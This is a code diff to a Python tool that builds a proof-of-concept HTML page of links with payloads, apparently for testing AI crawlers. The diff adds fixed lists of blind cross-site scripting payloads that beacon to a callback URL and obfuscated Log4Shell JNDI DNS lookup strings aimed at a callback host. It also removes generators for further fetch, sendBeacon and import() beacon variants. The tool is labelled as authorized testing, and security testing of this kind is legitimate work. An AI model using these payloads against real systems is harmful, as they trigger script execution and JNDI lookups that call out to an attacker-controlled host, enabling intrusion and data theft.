@@ -14,6 +14,39 @@ from urllib.parse import parse_qsl, quote, urlencode, urlsplit, urlunsplit
 
 MAX_LINKS = 1_000
 PAYLOADS = ("marker", "cache-bust", "blind-xss", "log4j-dns", "custom")
+BLIND_XSS_TEMPLATES = (
+    '<img src=x onerror="this.onerror=null;{js}">',
+    '"><img src=x onerror="this.onerror=null;{js}">',
+    "'><img src=x onerror=\"this.onerror=null;{js}\">",
+    '<svg onload="{js}">',
+    '"><svg onload="{js}">',
+    "'><svg onload=\"{js}\">",
+    '</title><svg onload="{js}">',
+    '</textarea><svg onload="{js}">',
+    "</script><script>{js}</script>",
+    '<details open ontoggle="{js}">',
+    '<input autofocus onfocus="{js}">',
+    '<video src=x onerror="this.onerror=null;{js}">',
+)
+LOG4J_DNS_TEMPLATES = (
+    "${jndi:dns://{host}/{path}}",
+    "${${lower:J}ndi:dns://{host}/{path}}",
+    "${j${lower:N}di:dns://{host}/{path}}",
+    "${jn${lower:D}i:dns://{host}/{path}}",
+    "${jnd${lower:I}:dns://{host}/{path}}",
+    "${${lower:J}${lower:N}${lower:D}${lower:I}:dns://{host}/{path}}",
+    "${${::-j}${::-n}${::-d}${::-i}:dns://{host}/{path}}",
+    "${j${::-n}di:dns://{host}/{path}}",
+    "${jndi:${lower:D}${lower:N}${lower:S}://{host}/{path}}",
+    "${${::-j}ndi:${::-d}ns://{host}/{path}}",
+)
+
+
+def payload_limit(kind: str) -> int:
+    return {
+        "blind-xss": len(BLIND_XSS_TEMPLATES),
+        "log4j-dns": len(LOG4J_DNS_TEMPLATES),
+    }.get(kind, MAX_LINKS)
 
 
 def _validated_targets(values: list[str]) -> list[str]:
@@ -51,71 +84,24 @@ def _callback_host(callback: str) -> str:
 
 
 def _fanout_payload(kind: str, n: int, token: str) -> str:
-    prefixes = {
-        "marker": ("marker", "trace", "probe", "request", "crawler", "visit",
-                   "link", "item", "resource", "poc"),
-        "cache-bust": ("cb", "nocache", "fresh", "bypass", "unique", "version",
-                       "cache", "miss", "nonce", "buster"),
-    }[kind]
-    separators = ("-", ".", "_", "~", "!", "$", ":", "/", ",", ";")
-    index = n - 1
-    prefix = prefixes[index % 10]
-    separator = separators[(index // 10) % 10]
-    shape = (index // 100) % 10
-    number = (str(n), f"{n:04d}", f"{n:x}", f"{n:o}", f"{n:b}")[shape % 5]
-    layouts = (
-        (prefix, token, number), (token, prefix, number),
-        (prefix, number, token), (number, prefix, token),
-        (prefix + token, number), (prefix, token + number),
-        (token, number, prefix), (number, token, prefix),
-        (prefix + number, token), (token, prefix + number),
-    )
-    return separator.join(layouts[shape])
+    prefix = "marker" if kind == "marker" else "cb"
+    return f"{prefix}-{token}-{n}"
 
 
 def _blind_xss_payload(n: int, beacon: str) -> str:
-    prefixes = ('">', "'>", "</title>", "</textarea>", "</script>")
-    elements = (
-        ('<img src=x {event}="this.onerror=null;{js}">', "onerror"),
-        ('<svg {event}="{js}">', "onload"),
-        ('<details open {event}="{js}">', "ontoggle"),
-        ('<video src=x {event}="this.onerror=null;{js}">', "onerror"),
-        ('<input autofocus {event}="{js}">', "onfocus"),
-    )
-    beacons = (
-        "fetch('{beacon}',{mode:'no-cors'})",
-        "(new Image).src='{beacon}'",
-        "navigator.sendBeacon('{beacon}')",
-        "location.assign('{beacon}')",
-        "import('{beacon}')",
-    )
-    index = n - 1
-    prefix = prefixes[index % 5]
-    element, event = elements[(index // 5) % 5]
-    javascript = beacons[(index // 25) % 5].replace("{beacon}", beacon)
-    case_mask = (index // 125) % 8
-    event = "".join(
-        char.upper() if position < 3 and case_mask & (1 << position) else char
-        for position, char in enumerate(event)
-    )
-    return prefix + element.replace("{event}", event).replace("{js}", javascript)
-
-
-def _obfuscated_word(word: str, index: int) -> tuple[str, int]:
-    pieces = []
-    for char in word:
-        forms = (char, "${lower:" + char.upper() + "}", "${::-" + char + "}")
-        pieces.append(forms[index % 3])
-        index //= 3
-    return "".join(pieces), index
+    if not 1 <= n <= len(BLIND_XSS_TEMPLATES):
+        raise ValueError(f"blind-xss supports at most {len(BLIND_XSS_TEMPLATES)} payloads")
+    javascript = "(new Image).src='{beacon}'".replace("{beacon}", beacon)
+    return BLIND_XSS_TEMPLATES[n - 1].replace("{js}", javascript)
 
 
 def _log4j_dns_payload(n: int, token: str, callback: str) -> str:
-    index = n - 1
-    jndi, index = _obfuscated_word("jndi", index)
-    dns, _ = _obfuscated_word("dns", index)
+    if not 1 <= n <= len(LOG4J_DNS_TEMPLATES):
+        raise ValueError(f"log4j-dns supports at most {len(LOG4J_DNS_TEMPLATES)} payloads")
     path = f"ai-bot-poc-{quote(token, safe='')}-{n}"
-    return "${" + jndi + ":" + dns + "://" + _callback_host(callback) + "/" + path + "}"
+    return (LOG4J_DNS_TEMPLATES[n - 1]
+            .replace("{host}", _callback_host(callback))
+            .replace("{path}", path))
 
 
 def make_payload(kind: str, *, n: int, target: str, token: str,
@@ -195,8 +181,8 @@ def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
     parser.add_argument("targets", nargs="*", help="Base target URL(s)")
     parser.add_argument("--targets-file", type=Path,
                         help="File containing one target URL per line")
-    parser.add_argument("--count", type=int, default=MAX_LINKS,
-                        help=f"Number of links, 1-{MAX_LINKS} (default: {MAX_LINKS})")
+    parser.add_argument("--count", type=int,
+                        help="Number of links (default: selected payload maximum)")
     parser.add_argument("--text", action="append", default=[],
                         help="Link text or increment template; repeat for a list")
     parser.add_argument("--text-file", type=Path,
@@ -215,8 +201,10 @@ def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
     parser.add_argument("--title", default="Authorized AI crawler test")
     parser.add_argument("--output", type=Path, default=Path("poc.html"))
     args = parser.parse_args(argv)
-    if not 1 <= args.count <= MAX_LINKS:
-        parser.error(f"--count must be between 1 and {MAX_LINKS}")
+    limit = payload_limit(args.payload)
+    args.count = limit if args.count is None else args.count
+    if not 1 <= args.count <= limit:
+        parser.error(f"--count must be between 1 and {limit} for {args.payload}")
     if not 1 <= args.random_length <= 128:
         parser.error("--random-length must be between 1 and 128")
     if not args.payload_param or any(c in args.payload_param for c in "&=?#"):
